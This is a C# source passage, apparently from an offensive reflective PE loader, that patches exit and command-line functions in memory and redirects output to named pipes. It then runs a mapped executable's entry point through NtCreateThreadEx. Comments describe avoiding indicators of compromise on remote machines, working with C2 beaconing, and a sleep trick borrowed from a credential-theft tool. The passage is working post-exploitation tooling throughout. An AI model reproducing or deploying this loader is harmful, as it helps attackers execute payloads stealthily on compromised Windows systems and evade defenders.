        IntPtr DonyBytePtr = Marshal.AllocHGlobal(1);

        IntPtr ExitThreadAddr = GetExportAddress(hkernel32, "ExitThread");

        _ = NtProtectVirtualMemory(new IntPtr(-1), FunctionAddr, NtTotalSize, PAGE_READWRITE, OldProtection);

        Marshal.Copy(AssemblyPatch, 0, FunctionAddr, AssemblyPatch.Length);
        FunctionAddr = IntPtr.Add(FunctionAddr, AssemblyPatch.Length);
        Marshal.StructureToPtr(DonyBytePtr, FunctionAddr, false);

        FunctionAddr = IntPtr.Add(FunctionAddr, IntPtr.Size);
        Marshal.Copy(AssemblyPatch2, 0, FunctionAddr, AssemblyPatch2.Length);
        FunctionAddr = IntPtr.Add(FunctionAddr, AssemblyPatch2.Length);
        Marshal.StructureToPtr(ExitThreadAddr, FunctionAddr, false);

        FunctionAddr = IntPtr.Add(FunctionAddr, IntPtr.Size);
        Marshal.Copy(CALL_MODRM, 0, FunctionAddr, CALL_MODRM.Length);

        _= NtProtectVirtualMemory(new IntPtr(-1), FunctionAddr, NtTotalSize, PAGE_EXECUTEREAD, OldProtection);


        Marshal.FreeHGlobal(DonyBytePtr);
    }


    NtClose(hMscoree);
    NtClose(hkernel32);
}


void RedirectStd(){ // Redirects stds, (i know how nasty that sounds, keep it your pants XD) 
    
    // stdout and stderr are captured
    var stdout = new NamedPipeServerStream("stdout", PipeDirection.Out);
    var stderr = new NamedPipeServerStream("stderr", PipeDirection.Out);

    IntPtr stdoutPIPEHandle = stdout.SafePipeHandle.DangerousGetHandle();
    IntPtr stderrPIPEHandle = stderr.SafePipeHandle.DangerousGetHandle();

    bool OUTinherit = SetHandleInformation(stdoutPIPEHandle, 0x00000001, 0x00000001);
    if (!OUTinherit) { Console.WriteLine("[-] Error in Configuring stdout pipe"); }
    
    bool ERRinherit = SetHandleInformation(stderrPIPEHandle, 0x00000001, 0x00000001);
    if (!ERRinherit) { Console.WriteLine("[-] Error in Configuring stderr pipe"); }


    SetStdHandle(-11, stdoutPIPEHandle); // as easy as it gets XD
    SetStdHandle(-12, stderrPIPEHandle); // as easy as it gets XD

    stdout.WaitForConnection();
    stderr.WaitForConnection();
    
}

void CleanOnExitEvent() // reason behind is to properly clean the memory on CTRL-C press
{
    uint old = 0;
    IntPtr ReleaseAllMemory = IntPtr.Zero;

    uint p = (uint)NtProtectVirtualMemory(new IntPtr(-1), codebase, NtSizeOfImage, PAGE_READWRITE, old);
    if (p != 0) { print("[-] Error in changing Memory Protection for Cleanup"); }

    byte[] zeroes = new byte[SizeOfImage];
    for (var i = 0; i < zeroes.Length; i++)
    {
        zeroes[i] = 0x00;
    }

    Marshal.Copy(zeroes.ToArray(), 0, codebase, (int)SizeOfImage);

    print("\n[*] Zeroed-Out all the memory");
    uint f = NtFreeVirtualMemory(new IntPtr(-1), ref codebase, ref ReleaseAllMemory, 0x00008000); // decommit and release at the same time
    if (f != 0) { print("[-] Error in Freeing the Allocated Memory for Cleanup"); }
    print("[*] Freed all allocated memory");
    if (!useSysCalls) { Map.FreeModule(ntdll); print("[*] Freed Mapped ntdll"); }
    Process.GetCurrentProcess().Kill();

}


void Suicide() {
    Thread.Sleep(15000);
    Process.GetCurrentProcess().Dispose();
    Process.GetCurrentProcess().Kill();

    /* 
    if a problem happened during remote execution and the Execution didn't end properly, resources including created
    NamedPipes and Remote Runspaces are not disposed properly which causes 2 things, 
    leaves IOCs on the remote machine
    prevents further remote reflections due to confusion in NamedPipe Communications

    this ensures that everytime a remote execution occurs after 15 seconds of Invoking the PE, 
    it will close itself automatically despite any problems that may cause hanging, so we don't have to worry about cleaning up
    */
}

void LocalSuicide() {
    Thread.Sleep(90000);
    Process.GetCurrentProcess().Dispose();
    Process.GetCurrentProcess().Kill();

    /*
    same as Suicide() but for local execution, this function is made to ensure reliable use with C2 channels 
    if the PE did not exit properly in cmd session we can press CTRL-C and thats it but with C2 due to beaconing and
    multithreaded executions its not that simple, this ensures even if the PE errored and did not exit, that after
    1.5 Mins it effectively will.
    the time the function waits before killing the process is 1.5 Mins, way longer than Suicide() to not interfere
    with actual execution
    */
}


void ExitEvent()
{
    Console.CancelKeyPress += (sender, eArgs) => { // on exit , clean up everything
        CleanOnExitEvent();
        Process.GetCurrentProcess().Kill();

    };
}

PatchGetCommandLineX();
Patch_xcmdln();
if (PatchExitProcs) { PatchExit(); }
ExitEvent();



int AddressOfEntryPoint = Is32bitPE == true ? (int)OptionalHeader32.AddressOfEntryPoint : (int)OptionalHeader64.AddressOfEntryPoint;
IntPtr threadStart = IntPtr.Add(codebase, AddressOfEntryPoint);
IntPtr hThread = IntPtr.Zero;

print("[+] Suicide Burn before Execution...."); // this trick is from BetterSafetyKatz repo ;)
Thread.Sleep(4219);

if (RedirectOutPut) { RedirectStd(); Thread suicide = new(()=> { Suicide(); }); suicide.Start(); }
if (!RedirectOutPut && !DisableLocalSuicide) { Thread LS = new(() => { LocalSuicide(); }); LS.Start(); }
NtCreateThreadEx(ref hThread, THREAD_ALL_ACCESS, IntPtr.Zero, new IntPtr(-1), threadStart, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
NtWaitForSingleObject(hThread, false, IntPtr.Zero);
CleanOnExitEvent(); // most of the time its not reachable but it is useful when its reachable 






// function Delegates definitions

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate uint NtAllocateVirtualMemory(
    IntPtr processHandle, // pseudo handle to the current process (IntPtr)(-1)
    ref IntPtr allocatedAddress, // NtAllocateVirtualMemory will fill up this parameter with the allocated memory 
    IntPtr zeroBits, // ZERO IntPtr.Zero
    ref IntPtr regionSize, // (IntPtr)OptionalHeader.SizeOfImage
    uint allocationType,
    uint memoryProtection
);


[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr NtClose(IntPtr HANDLE);


[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate uint NtProtectVirtualMemory(
    IntPtr processHandle,
    ref IntPtr baseAddress,
    ref IntPtr regionSize,
    uint newProtect,
    ref uint oldProtect
);



[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate uint NtFreeVirtualMemory(
    IntPtr processHandle,
    ref IntPtr baseAddress,
    ref IntPtr regionSize,
    uint freeType
);


[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate uint NtCreateThreadEx(
    ref IntPtr threadHandle,
    uint desiredAccess,
    IntPtr objectAttributes,
    IntPtr processHandle,
    IntPtr startAddress,
    IntPtr parameter,
    bool createSuspended,
    int stackZeroBits,
    int sizeOfStack,
    int maximumStackSize,
    IntPtr attributeList
);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr NtWaitForSingleObject(IntPtr HANDLE, bool BOOL, IntPtr Handle);

// kernelbase.dll 
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate bool SetHandleInformation(IntPtr hObject, int dwMask, int dwFlags);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate bool SetStdHandle(int nStdHandle, IntPtr hHandle);